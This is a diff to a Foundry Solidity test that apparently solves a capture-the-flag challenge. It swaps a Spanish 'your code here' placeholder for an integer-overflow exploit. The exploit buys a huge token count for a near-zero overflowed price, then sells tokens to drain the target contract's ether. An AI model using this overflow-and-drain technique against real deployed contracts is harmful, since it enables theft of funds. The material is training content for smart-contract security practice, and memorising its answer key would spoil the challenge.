@@ -18,7 +18,14 @@ contract Challenge1Test is Test {
     function testExample() public {
         vm.startPrank(address(player));
 
-        // tu codigo aca
+        uint256 numTokens = type(uint256).max / 1e18 + 1;
+        target.buy{value: numTokens * 1e18}(numTokens);
+        uint256 balance = address(target).balance;
+        emit log_named_uint("balance contrato", address(target).balance);
+
+        target.sell(balance / 1 ether);   
+        emit log_named_uint("balance contrato", address(target).balance);
+
         
         assertTrue(target.isComplete());
     }
